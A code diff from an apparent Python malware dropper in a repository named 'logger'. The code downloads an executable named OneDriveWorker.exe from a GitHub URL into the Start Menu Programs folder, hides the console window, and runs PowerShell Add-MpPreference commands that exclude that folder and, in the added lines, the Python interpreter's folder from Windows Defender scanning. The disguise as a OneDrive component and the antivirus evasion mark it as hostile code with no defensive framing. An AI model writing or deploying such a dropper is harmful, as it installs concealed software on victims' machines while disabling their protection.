@@ -2,12 +2,14 @@ import os
 from win32gui import ShowWindow, GetForegroundWindow
 from requests import get
 from subprocess import run, Popen
+from sys import executable
 
-workerName = 'OneDriveWorker.exe'
-url = f'https://github.com/Pixel48/logger/raw/exe/{workerName}'
+workername = 'OneDriveWorker'
+workerfile = f'{workername}.exe'
+url = f'https://github.com/Pixel48/logger/raw/exe/{workerfile}'
 
-folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', os.path.basename(workerName))
-filepath = os.path.join(folderpath, workerName)
+folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', workername)
+filepath = os.path.join(folderpath, workerfile)
 
 def create_folder(path):
     if not os.path.exists(path):
@@ -30,6 +32,8 @@ def setup_task():
 def defender_ignore(folderpath):
     create_folder(folderpath)
     command = f"Add-MpPreference -ExclusionPath '{folderpath}'"
+    run(['powershell', '-command', command ], check=True)
+    command = f"Add-MpPreference -ExclusionPath '{os.path.dirname(executable)}'"
     run(['powershell', '-command', command ], check=True)
 
 def main():
